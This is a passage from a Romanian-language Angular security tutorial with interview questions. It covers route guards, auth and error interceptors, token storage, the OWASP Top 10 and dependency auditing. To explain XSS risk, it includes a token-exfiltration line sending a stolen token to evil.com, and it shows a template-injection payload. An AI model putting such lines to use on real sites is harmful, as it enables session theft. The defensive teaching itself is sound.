  }
];

// Acces in componenta
@Component({
  selector: 'app-user-detail',
  template: `<h1>{{ user().name }}</h1>`
})
export class UserDetailComponent {
  // Metoda moderna cu input binding (Angular 16+)
  user = input.required<User>();

  // SAU metoda clasica cu ActivatedRoute
  // private route = inject(ActivatedRoute);
  // user = toSignal(this.route.data.pipe(map(data => data['user'])));
}
```

### Compunerea guardurilor

```typescript
// Combinarea mai multor guards
const routes: Routes = [
  {
    path: 'admin',
    canActivate: [authGuard, roleGuard],  // Se executa in ordine
    data: { roles: ['admin'] },
    children: [
      {
        path: 'users',
        canActivate: [featureGuard],  // Guard aditional pe copil
        data: { feature: 'user-management' },
        loadComponent: () => import('./admin/user-management.component')
          .then(m => m.UserManagementComponent),
        canDeactivate: [unsavedChangesGuard]
      },
      {
        path: 'settings',
        canActivate: [roleGuard],
        data: { roles: ['super-admin'] },  // Rol mai restrictiv
        loadComponent: () => import('./admin/settings.component')
          .then(m => m.SettingsComponent)
      }
    ]
  }
];
```

### Factory pentru guards reutilizabile

```typescript
// Guard factory - genereaza guard-uri cu parametri
export function requireRole(...roles: string[]): CanActivateFn {
  return (route, state) => {
    const authService = inject(AuthService);
    const router = inject(Router);

    if (!authService.isAuthenticated()) {
      router.navigate(['/login']);
      return false;
    }

    if (authService.hasAnyRole(roles)) {
      return true;
    }

    router.navigate(['/unauthorized']);
    return false;
  };
}

export function requireFeatureFlag(flag: string): CanActivateFn {
  return () => {
    const featureService = inject(FeatureFlagService);
    return featureService.isEnabled(flag);
  };
}

// Utilizare
const routes: Routes = [
  {
    path: 'billing',
    canActivate: [requireRole('admin', 'billing-manager')],
    loadComponent: () => import('./billing.component')
  },
  {
    path: 'beta-feature',
    canActivate: [requireFeatureFlag('beta-v2')],
    loadComponent: () => import('./beta-feature.component')
  }
];
```

---

## 6. HTTP Interceptors pentru securitate

### Abordarea functionala moderna (Angular 15+)

```typescript
// app.config.ts
import { provideHttpClient, withInterceptors } from '@angular/common/http';

export const appConfig: ApplicationConfig = {
  providers: [
    provideHttpClient(
      withInterceptors([
        // ORDINEA CONTEAZA! Se executa de sus in jos la cerere,
        // de jos in sus la raspuns.
        loggingInterceptor,      // 1. Logheaza cererea
        authInterceptor,         // 2. Adauga token-ul
        csrfInterceptor,         // 3. Adauga CSRF token
        retryInterceptor,        // 4. Retry la esec
        errorHandlingInterceptor // 5. Gestioneaza erori
      ])
    )
  ]
};
```

### Auth Token Interceptor (complet)

```typescript
// auth.interceptor.ts
import {
  HttpInterceptorFn,
  HttpRequest,
  HttpHandlerFn,
  HttpErrorResponse,
  HttpEvent
} from '@angular/common/http';
import { inject } from '@angular/core';
import { Observable, BehaviorSubject, throwError } from 'rxjs';
import { catchError, filter, take, switchMap } from 'rxjs/operators';

let isRefreshing = false;
const refreshTokenSubject = new BehaviorSubject<string | null>(null);

export const authInterceptor: HttpInterceptorFn = (
  req: HttpRequest<unknown>,
  next: HttpHandlerFn
): Observable<HttpEvent<unknown>> => {
  const authService = inject(AuthService);

  // Skip pentru cereri de autentificare
  if (isPublicRequest(req.url)) {
    return next(req);
  }

  // Adaugam token-ul la cerere
  const token = authService.getAccessToken();
  const authReq = token ? addAuthHeader(req, token) : req;

  return next(authReq).pipe(
    catchError((error: HttpErrorResponse) => {
      if (error.status === 401) {
        return handleUnauthorized(req, next, authService);
      }
      return throwError(() => error);
    })
  );
};

function addAuthHeader(
  req: HttpRequest<unknown>,
  token: string
): HttpRequest<unknown> {
  return req.clone({
    setHeaders: {
      Authorization: `Bearer ${token}`
    }
  });
}

function isPublicRequest(url: string): boolean {
  const publicPaths = ['/auth/login', '/auth/register', '/auth/refresh', '/public'];
  return publicPaths.some(path => url.includes(path));
}

function handleUnauthorized(
  req: HttpRequest<unknown>,
  next: HttpHandlerFn,
  authService: AuthService
): Observable<HttpEvent<unknown>> {
  if (!isRefreshing) {
    isRefreshing = true;
    refreshTokenSubject.next(null);

    return authService.refreshAccessToken().pipe(
      switchMap(tokens => {
        isRefreshing = false;
        refreshTokenSubject.next(tokens.accessToken);
        return next(addAuthHeader(req, tokens.accessToken));
      }),
      catchError(error => {
        isRefreshing = false;
        authService.logout();
        return throwError(() => error);
      })
    );
  }

  // Alte cereri asteapta refresh-ul curent
  return refreshTokenSubject.pipe(
    filter(token => token !== null),
    take(1),
    switchMap(token => next(addAuthHeader(req, token!)))
  );
}
```

### Error Handling Interceptor

```typescript
// error.interceptor.ts
import { HttpInterceptorFn, HttpErrorResponse } from '@angular/common/http';
import { inject } from '@angular/core';

export const errorHandlingInterceptor: HttpInterceptorFn = (req, next) => {
  const notificationService = inject(NotificationService);
  const router = inject(Router);

  return next(req).pipe(
    catchError((error: HttpErrorResponse) => {
      let errorMessage = 'A aparut o eroare necunoscuta';

      switch (error.status) {
        case 0:
          errorMessage = 'Nu se poate conecta la server. Verificati conexiunea.';
          break;
        case 400:
          errorMessage = error.error?.message || 'Cerere invalida';
          break;
        case 401:
          // Gestionat de auth interceptor
          break;
        case 403:
          errorMessage = 'Nu aveti permisiunea de a accesa aceasta resursa';
          router.navigate(['/forbidden']);
          break;
        case 404:
          errorMessage = 'Resursa nu a fost gasita';
          break;
        case 422:
          // Erori de validare
          errorMessage = formatValidationErrors(error.error?.errors);
          break;
        case 429:
          errorMessage = 'Prea multe cereri. Incercati din nou mai tarziu.';
          break;
        case 500:
          errorMessage = 'Eroare interna de server';
          break;
        case 503:
          errorMessage = 'Serviciul este temporar indisponibil';
          break;
      }

      if (error.status !== 401) {
        notificationService.showError(errorMessage);
      }

      // Log eroarea pentru debugging / monitorizare
      console.error(`HTTP Error ${error.status}:`, {
        url: req.url,
        method: req.method,
        message: error.message,
        body: error.error
      });

      return throwError(() => error);
    })
  );
};

function formatValidationErrors(errors: Record<string, string[]>): string {
  if (!errors) return 'Eroare de validare';
  return Object.entries(errors)
    .map(([field, msgs]) => `${field}: ${msgs.join(', ')}`)
    .join('\n');
}
```

### Retry Interceptor

```typescript
// retry.interceptor.ts
import { HttpInterceptorFn } from '@angular/common/http';
import { retry, timer } from 'rxjs';

export const retryInterceptor: HttpInterceptorFn = (req, next) => {
  // Retry doar pentru cereri GET (idempotente)
  if (req.method !== 'GET') {
    return next(req);
  }

  return next(req).pipe(
    retry({
      count: 3,         // Maxim 3 incercari
      delay: (error, retryCount) => {
        // Nu facem retry pentru erori de autorizare sau client
        if (error.status === 401 || error.status === 403 ||
            (error.status >= 400 && error.status < 500)) {
          throw error;  // Stop retry
        }
        // Exponential backoff: 1s, 2s, 4s
        const delayMs = Math.pow(2, retryCount - 1) * 1000;
        console.warn(
          `Retry ${retryCount}/3 for ${req.url} in ${delayMs}ms`
        );
        return timer(delayMs);
      }
    })
  );
};
```

### Logging Interceptor

```typescript
// logging.interceptor.ts
import { HttpInterceptorFn } from '@angular/common/http';
import { tap, finalize } from 'rxjs';

export const loggingInterceptor: HttpInterceptorFn = (req, next) => {
  // Doar in development
  if (!isDevMode()) {
    return next(req);
  }

  const startTime = performance.now();
  const requestId = crypto.randomUUID().slice(0, 8);

  console.groupCollapsed(
    `%c[HTTP] ${req.method} ${req.urlWithParams}`,
    'color: #4CAF50; font-weight: bold'
  );
  console.log('Headers:', req.headers.keys().reduce((acc, key) => {
    // Nu logam token-urile
    if (key.toLowerCase() === 'authorization') {
      acc[key] = 'Bearer ***';
    } else {
      acc[key] = req.headers.get(key);
    }
    return acc;
  }, {} as Record<string, any>));

  if (req.body) {
    console.log('Body:', req.body);
  }
  console.groupEnd();

  return next(req).pipe(
    tap({
      next: (event) => {
        if (event instanceof HttpResponse) {
          const duration = Math.round(performance.now() - startTime);
          console.log(
            `%c[HTTP] ${req.method} ${req.url} -> ${event.status} (${duration}ms)`,
            `color: ${event.status < 400 ? '#4CAF50' : '#f44336'}`
          );
        }
      },
      error: (error: HttpErrorResponse) => {
        const duration = Math.round(performance.now() - startTime);
        console.error(
          `%c[HTTP] ${req.method} ${req.url} -> ${error.status} (${duration}ms)`,
          'color: #f44336',
          error.message
        );
      }
    })
  );
};
```

### Interceptor cu request caching

```typescript
// cache.interceptor.ts
const cache = new Map<string, { response: HttpResponse<any>; timestamp: number }>();
const CACHE_DURATION = 5 * 60 * 1000; // 5 minute

export const cacheInterceptor: HttpInterceptorFn = (req, next) => {
  // Cache doar pentru cereri GET
  if (req.method !== 'GET') {
    // Invalidam cache-ul la mutatie
    cache.forEach((value, key) => {
      if (key.startsWith(req.url.split('?')[0])) {
        cache.delete(key);
      }
    });
    return next(req);
  }

  // Verificam daca avem cache valid
  const cacheKey = req.urlWithParams;
  const cached = cache.get(cacheKey);

  if (cached && (Date.now() - cached.timestamp) < CACHE_DURATION) {
    return of(cached.response.clone());
  }

  return next(req).pipe(
    tap(event => {
      if (event instanceof HttpResponse) {
        cache.set(cacheKey, {
          response: event.clone(),
          timestamp: Date.now()
        });
      }
    })
  );
};
```

### Ordinea interceptoarelor - vizual

```
Cerere HTTP:
  Client -> [Logging] -> [Auth] -> [CSRF] -> [Retry] -> [Error] -> Server

Raspuns HTTP:
  Server -> [Error] -> [Retry] -> [CSRF] -> [Auth] -> [Logging] -> Client

La cerere: se executa in ordinea din array (primul -> ultimul)
La raspuns: se executa in ordine inversa (ultimul -> primul)

De aceea:
- Logging este PRIMUL (logheaza totul, inclusiv headerele adaugate de alte interceptoare)
- Error handling este ULTIMUL (poate intercepta erori generate de orice alt interceptor)
```

---

## 7. HttpOnly cookies vs localStorage

### Comparatie de securitate

| Caracteristica | HttpOnly Cookie | localStorage | sessionStorage | In-Memory |
|---|---|---|---|---|
| **Accesibil din JS** | NU (protejat) | DA (vulnerabil) | DA (vulnerabil) | DA (dar izolat) |
| **Vulnerabil la XSS** | NU | DA | DA | Partial |
| **Trimis automat** | DA (cu cereri HTTP) | NU | NU | NU |
| **Vulnerabil la CSRF** | DA | NU | NU | NU |
| **Persistenta** | Configurabila (Expires) | Permanenta | Sesiune tab | Sesiune pagina |
| **Capacitate** | ~4KB per cookie | ~5-10MB | ~5-10MB | Limitat de RAM |
| **Server-side control** | DA (Set-Cookie) | NU | NU | NU |

### Vulnerabilitatile localStorage la XSS

```typescript
// ❌ PERICULOS: Stocarea token-urilor in localStorage
localStorage.setItem('access_token', token);

// Daca un atacator reuseste XSS (chiar si prin o biblioteca third-party):
// Poate citi TOATE datele din localStorage
const stolenToken = localStorage.getItem('access_token');
// Si le poate trimite la serverul sau:
fetch('https://evil.com/steal?token=' + stolenToken);

// Atacatorul are acum acces complet la contul utilizatorului
// Token-ul poate fi folosit din ORICE browser/locatie
// Nu exista nicio modalitate de a preveni acest lucru daca XSS a avut loc
```

### Avantajele HttpOnly cookies

```typescript
// ✅ SIGUR: Token-ul este intr-un HttpOnly cookie
// Server-ul seteaza cookie-ul:
// Set-Cookie: refresh_token=abc123;
//   HttpOnly;     <- NU poate fi citit din JavaScript
//   Secure;       <- Trimis DOAR pe HTTPS
//   SameSite=Strict;  <- NU trimis in cereri cross-site
//   Path=/api/auth;   <- Trimis DOAR catre path-uri de auth
//   Max-Age=604800;   <- Expira in 7 zile

// Chiar daca atacatorul reuseste XSS:
document.cookie; // NU va contine refresh_token (este HttpOnly)
// Atacatorul NU poate citi sau exfiltra token-ul

// Angular trimite cookie-ul automat cu withCredentials: true
this.http.post('/api/auth/refresh', {}, {
  withCredentials: true  // Trimite cookie-urile automat
});
```

### Best Practice: Strategia hibrida

```
                    ┌─────────────────────────────────────┐
                    │         STRATEGIA RECOMANDATA         │
                    ├─────────────────────────────────────┤
                    │                                     │
                    │  Access Token (scurt: 15-30 min)    │
                    │  → Stocat IN MEMORIE (variabila JS) │
                    │  → Trimis ca Bearer header          │
                    │  → Se pierde la refresh pagina      │
                    │  → OK, se regenereaza din refresh   │
                    │                                     │
                    │  Refresh Token (lung: 7-30 zile)    │
                    │  → Stocat ca HttpOnly cookie        │
                    │  → Trimis automat de browser        │
                    │  → Inaccesibil din JavaScript       │
                    │  → Folosit DOAR pt a obtine         │
                    │    un nou access token               │
                    │                                     │
                    └─────────────────────────────────────┘
```

```typescript
// Implementarea strategiei hibride

// auth.service.ts
@Injectable({ providedIn: 'root' })
export class AuthService {
  // Access token DOAR in memorie - cea mai sigura optiune
  private accessToken: string | null = null;

  login(credentials: LoginCredentials): Observable<void> {
    return this.http.post<{ accessToken: string }>(
      '/api/auth/login',
      credentials,
      {
        withCredentials: true  // Server-ul seteaza refresh token ca HttpOnly cookie
      }
    ).pipe(
      tap(response => {
        // Stocam access token DOAR in memorie
        this.accessToken = response.accessToken;
      }),
      map(() => void 0)
    );
  }

  refreshToken(): Observable<string> {
    return this.http.post<{ accessToken: string }>(
      '/api/auth/refresh',
      {},  // Body gol - refresh token-ul este trimis automat ca cookie
      { withCredentials: true }
    ).pipe(
      tap(response => {
        this.accessToken = response.accessToken;
      }),
      map(response => response.accessToken)
    );
  }

  // Cand pagina se reincarca, access token-ul se pierde din memorie.
  // La initializarea aplicatiei, facem un silent refresh:
  initializeAuth(): Observable<boolean> {
    return this.refreshToken().pipe(
      map(() => true),
      catchError(() => of(false))  // Nu avem sesiune valida
    );
  }
}

// APP_INITIALIZER pentru silent refresh la pornire
export const appConfig: ApplicationConfig = {
  providers: [
    {
      provide: APP_INITIALIZER,
      useFactory: () => {
        const authService = inject(AuthService);
        return () => firstValueFrom(authService.initializeAuth());
      },
      multi: true
    }
  ]
};
```

### Tabel comparativ: Cand sa folosesti ce

| Scenariu | Stocare recomandata | Motivatie |
|---|---|---|
| **Refresh token** | HttpOnly cookie | Cel mai sigur, inaccesibil din JS |
| **Access token** | In-memory (variabila) | Se pierde la refresh, dar se regenereaza |
| **Preferinte UI** | localStorage | Nu este sensibil, nu e nevoie de securitate |
| **Date de sesiune** | sessionStorage | Se curata la inchiderea tab-ului |
| **Date sensibile** | NICIODATA client-side | Pastrati-le pe server |
| **CSRF token** | Cookie non-HttpOnly | Angular trebuie sa-l citeasca |

---

## 8. OWASP Top 10 pentru Angular

### A01: Injection (Template Injection)

Angular previne **template injection** prin design. Template-urile sunt compilate AOT (Ahead-of-Time), deci nu pot fi modificate la runtime.

```typescript
// ❌ PERICULOS: Template dinamic (posibil in versiuni vechi)
// NU mai este posibil in Angular modern cu AOT
// dar trebuie inteles conceptul

// ❌ Server-Side Template Injection
// Daca server-ul construieste template-ul Angular:
// const template = `<div>${userInput}</div>`; // Pe server!
// Atacatorul poate injecta: {{ constructor.constructor('alert(1)')() }}

// ✅ CORECT: Folositi data binding, nu template-uri dinamice
@Component({
  template: `<div>{{ safeContent }}</div>`
})
export class SafeComponent {
  safeContent = this.userInput; // Angular escapeaza automat
}

// ❌ PERICULOS: Evaluare dinamica de expresii
// Niciodata nu evaluati expresii din input utilizator
eval(userInput);                    // Executie arbitrara de cod
new Function(userInput)();          // La fel de periculos
setTimeout(userInput, 0);           // Poate executa cod daca e string
setInterval(userInput, 1000);       // La fel
```

### A02: Broken Authentication

```typescript
// Vulnerabilitati comune si solutii

// ❌ Token stocat in localStorage
localStorage.setItem('token', jwt); // Vulnerabil la XSS

// ✅ Token in memorie + refresh in HttpOnly cookie
this.accessToken = jwt; // Doar in variabila

// ❌ Token fara expirare
// JWT fara camp 'exp' -> acces permanent daca este furat

// ✅ Token-uri cu expirare scurta
// Access token: 15 minute
// Refresh token: 7 zile cu rotatie

// ❌ Fara rate limiting pe login
// Atacatorul poate incerca mii de parole

// ✅ Rate limiting + account lockout
// Implementat pe server: max 5 incercari in 15 minute

// ❌ Parole slabe permise
// ✅ Validare parola client-side (+ server-side!)
export function strongPasswordValidator(): ValidatorFn {
  return (control: AbstractControl): ValidationErrors | null => {
    const value = control.value;
    if (!value) return null;

    const checks = {
      minLength: value.length >= 12,
      hasUpper: /[A-Z]/.test(value),
      hasLower: /[a-z]/.test(value),
      hasNumber: /\d/.test(value),
      hasSpecial: /[!@#$%^&*(),.?":{}|<>]/.test(value),
      noCommon: !COMMON_PASSWORDS.includes(value.toLowerCase())
    };

    const isValid = Object.values(checks).every(Boolean);
    return isValid ? null : { weakPassword: checks };
  };
}
```

### A03: Sensitive Data Exposure

```typescript
// ❌ Date sensibile in URL (vizibile in logs, history, referrer)
this.http.get(`/api/users?ssn=${ssn}&creditCard=${card}`);

// ✅ Date sensibile in body (POST)
this.http.post('/api/users/verify', { ssn, creditCard });

// ❌ Date sensibile in localStorage
localStorage.setItem('user', JSON.stringify({ ssn: '123-45-6789' }));

// ✅ Nu stocati date sensibile client-side
// Solicitati-le de la server doar cand sunt necesare

// ❌ Logarea datelor sensibile
console.log('User:', { email, password, token }); // In productie!

// ✅ Logare sanitizata
console.log('User login attempt:', { email }); // Fara parola/token

// ❌ Chei API in cod sursa
const API_KEY = 'sk-1234567890abcdef'; // In bundle-ul JS

// ✅ Chei API pe server (proxy)
// Client -> Backend Proxy -> External API (cu cheia)
this.http.get('/api/proxy/weather?city=Bucharest');
// Backend-ul adauga cheia API si face cererea

// Configurare environment corecta
// environment.ts
export const environment = {
  production: false,
  apiUrl: '/api',          // ✅ URL relativ, fara chei
  // apiKey: 'secret123'   // ❌ NICIODATA
};
```

### A05: Security Misconfiguration

```typescript
// ❌ CORS permisiv
// Access-Control-Allow-Origin: *
// Cu credentiale, browser-ul blocheaza *, dar fara credentiale
// oricine poate face cereri

// ✅ CORS restrictiv (server-side)
// Access-Control-Allow-Origin: https://app.example.com
// Access-Control-Allow-Methods: GET, POST, PUT, DELETE
// Access-Control-Allow-Headers: Content-Type, Authorization
// Access-Control-Allow-Credentials: true

// ❌ Source maps in productie
// angular.json -> sourceMap: true in production build
// Atacatorul poate vedea codul sursa original

// ✅ Dezactivare source maps in productie
// angular.json
{
  "configurations": {
    "production": {
      "sourceMap": false,        // ✅ Dezactivat
      "optimization": true,
      "outputHashing": "all",
      "budgets": [
        {
          "type": "initial",
          "maximumWarning": "500kb",
          "maximumError": "1mb"
        }
      ]
    }
  }
}

// ❌ Debug mode in productie
// enableProdMode() lipseste sau este conditionat gresit

// ✅ Productie corecta (Angular 15+ cu standalone)
// main.ts - Angular detecteaza automat din build configuration
```

### A06: Cross-Site Scripting (XSS)

Acoperit detaliat in [Sectiunea 1](#1-xss-prevention). Puncte cheie suplimentare:

```typescript
// Tipuri de XSS:
// 1. Reflected XSS - Input din URL reflectat in pagina
// 2. Stored XSS - Input malitios stocat in DB si afisat altor utilizatori
// 3. DOM-based XSS - Manipulare DOM client-side

// Angular protejeaza impotriva tuturor prin sanitizare automata.
// DAR trebuie sa evitam:

// ❌ Bypass-uri inutile
this.sanitizer.bypassSecurityTrustHtml(userInput);

// ❌ Manipulare DOM directa
this.el.nativeElement.innerHTML = userInput;

// ❌ Biblioteci third-party care manipuleaza DOM-ul
// jQuery, direct DOM manipulation libraries

// ✅ Folositi DOAR binding-urile Angular
// {{ interpolation }}, [property], (event)
```

### A08: Insecure Deserialization

```typescript
// ❌ Deserializare nesigura de date din URL/localStorage
const data = JSON.parse(atob(urlParam)); // Ce daca e malformat?
const config = JSON.parse(localStorage.getItem('config')!);

// ✅ Validare si tipizare la deserializare
import { z } from 'zod'; // sau class-validator, io-ts

// Definim schema
const UserSchema = z.object({
  id: z.string().uuid(),
  email: z.string().email(),
  roles: z.array(z.enum(['user', 'admin', 'editor'])),
  createdAt: z.string().datetime()
});

type User = z.infer<typeof UserSchema>;

// Validam datele primite
function parseUser(data: unknown): User {
  const result = UserSchema.safeParse(data);
  if (!result.success) {
    console.error('Invalid user data:', result.error);
    throw new Error('Invalid user data');
  }
  return result.data;
}

// Utilizare in serviciu
@Injectable({ providedIn: 'root' })
export class UserService {
  getUser(id: string): Observable<User> {
    return this.http.get<unknown>(`/api/users/${id}`).pipe(
      map(data => parseUser(data))  // Validare stricta
    );
  }
}
```

### A09: Using Components with Known Vulnerabilities

Acoperit detaliat in [Sectiunea 9](#9-dependency-auditing). Sumar:

```bash
# Verificare regulata
npm audit
npx snyk test

# Actualizare Angular
ng update @angular/core @angular/cli

# Monitorizare continua
# Configurati Dependabot sau Renovate in CI/CD
```

---

## 9. Dependency Auditing

### npm audit

```bash
# Scanare vulnerabilitati
npm audit

# Afisare doar vulnerabilitati critice si high
npm audit --audit-level=high

# Fix automat (doar pentru dependente directe, versiuni compatibile)
npm audit fix

# Fix agresiv (poate face breaking changes - ATENTIE!)
npm audit fix --force

# Generare raport JSON (util pentru CI/CD)
npm audit --json > audit-report.json

# Verificare in CI/CD pipeline
npm audit --audit-level=high || exit 1
```

### Snyk

```bash
# Instalare
npm install -g snyk

# Autentificare
snyk auth

# Testare proiect
snyk test

# Monitorizare continua (adauga proiectul la dashboard Snyk)
snyk monitor

# Testare doar vulnerabilitati high si critical
snyk test --severity-threshold=high

# Testare cu ignorare (pentru false positives)
snyk test --policy-path=.snyk

# Fisier .snyk pentru excluderi
# .snyk
# version: v1.25.0
# ignore:
#   SNYK-JS-LODASH-590103:
#     - '*':
#         reason: 'Nu folosim functia vulnerabila'
#         expires: 2025-12-31T00:00:00.000Z
```

### Dependabot si Renovate

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
    open-pull-requests-limit: 10
    # Gruparea update-urilor Angular
    groups:
      angular:
        patterns:
          - "@angular/*"
          - "@angular-devkit/*"
          - "zone.js"
        update-types:
          - "minor"
          - "patch"
      typescript:
        patterns:
          - "typescript"
          - "tslib"
    # Ignorare versiuni majore (necesita revizuire manuala)
    ignore:
      - dependency-name: "*"
        update-types: ["version-update:semver-major"]
    # Etichetare automata
    labels:
      - "dependencies"
      - "automated"
    reviewers:
      - "team-leads"
```

```json5
// renovate.json (Renovate Bot - alternativa la Dependabot)
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": [
    "config:base",
    "group:angularJs",
    ":semanticCommits"
  ],
  "packageRules": [
    {
      "matchPackagePatterns": ["@angular/.*"],
      "groupName": "Angular",
      "automerge": false
    },
    {
      "matchUpdateTypes": ["patch"],
      "matchPackagePatterns": ["*"],
      "automerge": true,
      "automergeType": "branch"
    }
  ],
  "vulnerabilityAlerts": {
    "enabled": true,
    "labels": ["security"]
  }
}
```

### Importanta lock file-ului

```bash
# package-lock.json / yarn.lock trebuie MEREU comis in git
# Asigura ca toti dezvoltatorii si CI/CD folosesc EXACT aceleasi versiuni

# ❌ Nu faceti
echo "package-lock.json" >> .gitignore

# ✅ Comiteti mereu lock file-ul
git add package-lock.json
git commit -m "chore: update lock file"

# In CI/CD, folositi 'ci' in loc de 'install'
npm ci  # Instaleaza EXACT versiunile din lock file
# vs
npm install  # Poate actualiza lock file-ul (nedorit in CI)
```

### Script de audit automatizat

```json
{
  "scripts": {
    "security:audit": "npm audit --audit-level=high",
    "security:check": "npm audit --json | node scripts/check-audit.js",
    "security:outdated": "npm outdated",
    "security:update-angular": "ng update @angular/core @angular/cli",
    "precommit:security": "npm audit --audit-level=critical"
  }
}
```

```typescript
// scripts/check-audit.js
// Script custom pentru verificare audit in CI/CD
const audit = require('fs').readFileSync(0, 'utf8'); // stdin
const report = JSON.parse(audit);

const critical = report.metadata?.vulnerabilities?.critical ?? 0;
const high = report.metadata?.vulnerabilities?.high ?? 0;

console.log(`Vulnerabilitati: ${critical} critical, ${high} high`);

if (critical > 0) {
  console.error('BLOCKER: Exista vulnerabilitati CRITICE!');
  process.exit(1);
}

if (high > 0) {
  console.warn('WARNING: Exista vulnerabilitati HIGH');
  // Putem decide daca blocam sau nu
  // process.exit(1);
}

console.log('Security check passed');
```

### Best Practices pentru dependinte

1. **Minimizati dependintele** - Cu cat mai putine pachete, cu atat mai putine vulnerabilitati potentiale
2. **Evaluati inainte de instalare** - Verificati: ultima actualizare, numarul de dependinte, maintaineri
3. **Pinuiti versiunile critice** - Folositi versiuni exacte pentru dependinte de securitate
4. **Automatizati scanarea** - Integrati npm audit in CI/CD pipeline
5. **Actualizati regulat** - Nu lasati dependintele sa se invecheasca prea mult
6. **Revizuiti lock file diffs** - La PR-uri, verificati ce s-a schimbat in package-lock.json
7. **Folositi `npm ci`** - In CI/CD, pentru instalari reproductibile
8. **Subresource Integrity (SRI)** - Pentru CDN-uri, verificati hash-urile

```html
<!-- SRI pentru scripturi externe -->
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
  crossorigin="anonymous">
</script>
```

---

## Intrebari frecvente de interviu

### 1. Cum previne Angular atacurile XSS si care sunt limitarile?

**Raspuns:** Angular previne XSS prin **sanitizare automata by default**. Toate valorile interpolate in template-uri (`{{ }}`, `[innerHTML]`, `[href]`, `[style]`) sunt sanitizate in functie de contextul lor (`SecurityContext.HTML`, `URL`, `STYLE`, `RESOURCE_URL`). Angular elimina tag-urile si atributele periculoase (`<script>`, `onerror`, `javascript:`) dar pastreaza continutul sigur.

**Limitari:** Sanitizarea **nu** protejeaza daca:
- Folositi `bypassSecurityTrustHtml()` cu date de la utilizator
- Manipulati DOM-ul direct prin `ElementRef.nativeElement`
- Folositi `document.write()`, `eval()` sau `innerHTML` nativ
- O biblioteca third-party scrie direct in DOM
- Server-ul construieste template-uri Angular dinamic (SSR template injection)

**Best practice:** Lasati sanitizarea automata sa functioneze. Daca trebuie sa faceti bypass, creati un Pipe dedicat cu validare stricta si limitati bypass-ul la pattern-uri cunoscute (ex: doar URL-uri YouTube cu ID validat).

---

### 2. Care este diferenta intre stocarea token-urilor in localStorage vs HttpOnly cookies? Care este strategia optima?

**Raspuns:** **localStorage** este accesibil din JavaScript, deci orice atac XSS (chiar si prin o biblioteca third-party compromise) poate exfiltra token-ul. Atacatorul poate folosi token-ul din orice locatie. **HttpOnly cookies** nu sunt accesibile din JavaScript (`document.cookie` nu le returneaza), dar sunt trimise automat cu fiecare cerere HTTP, ceea ce le face vulnerabile la CSRF.

**Strategia optima este hibrida:**
- **Access token** (scurt, 15-30 min) stocat **in memorie** (variabila JavaScript) - se pierde la refresh pagina dar se regenereaza
- **Refresh token** (lung, 7-30 zile) stocat ca **HttpOnly + Secure + SameSite=Strict cookie** - inaccesibil din JS, protejat de CSRF prin SameSite
- La incarcarea paginii, se face un **silent refresh** folosind cookie-ul pentru a obtine un nou access token
- Access token-ul este trimis ca `Authorization: Bearer` header (nu ca cookie), eliminand riscul CSRF

---

### 3. Explicati cum functioneaza CSRF protection in Angular si de ce este necesar.

**Raspuns:** CSRF exploateaza faptul ca browser-ul trimite automat cookie-urile cu fiecare cerere. Un site malitios poate face o cerere POST catre API-ul nostru, iar browser-ul va atasa cookie-ul de sesiune automat.

Angular implementeaza **Double Submit Cookie Pattern**:
1. Server-ul seteaza un cookie `XSRF-TOKEN` (non-HttpOnly, ca Angular sa-l poata citi)
2. Angular `HttpClient` citeste automat acest cookie si il trimite ca header `X-XSRF-TOKEN`
3. Server-ul verifica ca header-ul corespunde cookie-ului
4. Un site extern poate trimite cookie-ul (browser-ul il ataseaza automat), dar **nu poate citi** cookie-ul pentru a-l pune in header (Same-Origin Policy)

Configurare moderna: `provideHttpClient(withXsrfConfiguration({ cookieName: 'XSRF-TOKEN', headerName: 'X-XSRF-TOKEN' }))`. Angular adauga header-ul doar pentru cereri mutative (POST, PUT, DELETE, PATCH) catre same-origin.

**SameSite=Strict** pe cookie-uri ofera protectie suplimentara, dar nu inlocuieste complet CSRF tokens deoarece nu toate browserele vechi il suporta.

---

### 4. Ce sunt Functional Guards in Angular modern si cum difera de class-based guards?

**Raspuns:** Incepand cu Angular 15+, guards sunt **functii simple** (`CanActivateFn`, `CanDeactivateFn`, `CanMatchFn`) in loc de clase care implementeaza interfete. Avantaje:

- **Mai concise**: O functie vs o clasa cu decorator, constructor, interfata implementata
- **Mai compozabile**: Se pot crea factory functions care genereaza guards cu parametri
- **Acces la DI prin `inject()`**: Nu necesita constructor injection
- **Tree-shakable**: Functiile sunt mai usor de eliminat daca nu sunt folosite

`CanMatchFn` inlocuieste `CanLoad` si este mai puternica: determina daca o ruta se **potriveste** in faza de matching, permitand rute alternative (ex: dashboard diferit pentru admin vs user pe aceeasi cale). `CanActivate` se executa **dupa** matching si doar blocheaza/permite navigarea.

Factory pattern: `export function requireRole(...roles: string[]): CanActivateFn { return (route, state) => { ... } }` permite: `canActivate: [requireRole('admin', 'editor')]`.

---

### 5. Cum implementati un mecanism complet de token refresh cu interceptor?

**Raspuns:** Implementarea necesita gestionarea a trei scenarii: adaugarea token-ului, refresh la expirare, si cozirea cererilor concurente.

**Mecanismul:**
1. Interceptorul adauga `Authorization: Bearer` header la fiecare cerere (exceptand cererile de auth)
2. La primirea unui **401**, interceptorul face o cerere de refresh
3. Daca refresh-ul reuseste, **re-trimite** cererea originala cu noul token
4. Daca refresh-ul esueaza, face **logout**
5. **Problema concurentei**: Daca mai multe cereri primesc 401 simultan, doar UNA trebuie sa faca refresh, celelalte asteapta
6. Se foloseste un `BehaviorSubject` ca semaphore: prima cerere seteaza `isRefreshing = true`, celelalte se aboneaza si asteapta noul token

**Aspecte critice**: Token refresh-ul trebuie exclus din interceptor (altfel se creeaza o bucla infinita). Cererile in queue trebuie sa primeasca noul token cand refresh-ul se termina.

---

### 6. Ce este Content Security Policy si cum se configureaza pentru Angular?

**Raspuns:** CSP este un header HTTP care restrictioneaza sursele din care browser-ul poate incarca resurse. Este ultima linie de aparare impotriva XSS: chiar daca un atacator reuseste sa injecteze un `<script>`, browser-ul il blocheaza daca sursa nu este in whitelist.

**Provocarea cu Angular:** Angular genereaza stiluri inline pentru `ViewEncapsulation.Emulated` (default). CSP cu `style-src 'self'` le blocheaza. Solutia: **nonce-based CSP**.

**Configurare:**
1. Server-ul genereaza un nonce criptografic unic per cerere
